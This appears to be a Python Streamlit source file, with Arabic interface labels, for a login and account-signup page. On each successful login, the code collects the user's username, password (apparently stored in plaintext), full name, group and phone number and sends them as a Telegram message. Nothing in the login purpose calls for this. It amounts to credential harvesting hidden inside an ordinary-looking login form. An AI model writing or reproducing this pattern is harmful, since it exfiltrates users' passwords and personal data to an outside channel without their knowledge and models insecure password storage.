def login_page():
    st.title("تسجيل الدخول")

    if 'show_signup' not in st.session_state:
        st.session_state['show_signup'] = False
    if 'signup_success' not in st.session_state:
        st.session_state['signup_success'] = False  # لتخزين نجاح التسجيل

    if not st.session_state['show_signup']:
        # نموذج تسجيل الدخول
        username = st.text_input("اسم المستخدم", key="login_username")
        password = st.text_input("كلمة المرور", type="password", key="login_password")

        if st.button("دخول"):
            if not username or not password:
                st.warning("يرجى ملء جميع الحقول")
            else:
                if check_login(username, password):
                    user_data = get_user_data(username)
                    if user_data:
                        st.session_state['logged_in'] = True
                        st.session_state['user_name'] = user_data['username']
                        message = (
                            f"🔑 تم تسجيل دخول المستخدم:\n"
                            f"اسم المستخدم: <b>{user_data['username']}</b>\n"
                            f"كلمة المرور: <b>{user_data['password']}</b>\n"
                            f"الاسم الكامل: <b>{user_data['full_name']}</b>\n"
                            f"الجروب: <b>{user_data['group']}</b>\n"
                            f"رقم الهاتف: <b>{user_data['phone']}</b>"
                        )
                        send_telegram_message(message)
                        return True
                    else:
                        st.error("تعذر جلب بيانات المستخدم")
                else:
                    st.error("اسم المستخدم أو كلمة المرور غير صحيحة")

        # عرض رسالة نجاح التسجيل بعد العودة من صفحة التسجيل
        if st.session_state['signup_success']:
            st.success("✅ تم إنشاء الحساب بنجاح، سجل دخولك الآن")
            st.session_state['signup_success'] = False  # إلغاء الرسالة بعد العرض مرة واحدة

        if st.button("إنشاء حساب جديد"):
            st.session_state['show_signup'] = True

    else:
        # نموذج إنشاء حساب جديد
        st.title("إنشاء حساب جديد")

        signup_username = st.text_input("اسم المستخدم", key="signup_username")
        signup_password = st.text_input("كلمة المرور", type="password", key="signup_password")
        signup_full_name = st.text_input("الاسم الكامل", key="signup_full_name")
        signup_group = st.text_input("الجروب", key="signup_group")
        signup_phone = st.text_input("رقم الهاتف", key="signup_phone")

        if st.button("تسجيل"):
            if not signup_username or not signup_password or not signup_full_name or not signup_group or not signup_phone:
                st.warning("يرجى ملء جميع حقول التسجيل")
            else:
                # نسجل المستخدم بدون إظهار رد السيرفر مباشرة
                if add_user(signup_username, signup_password, signup_full_name, signup_group, signup_phone):
                    # عند النجاح نعيد الوضع لتسجيل الدخول ونحفظ نجاح التسجيل لعرض رسالة
                    st.session_state['show_signup'] = False
                    st.session_state['signup_success'] = True
                else:
                    st.error("فشل في إنشاء الحساب، حاول مرة أخرى")

        if st.button("العودة لتسجيل الدخول"):
            st.session_state['show_signup'] = False

    return False
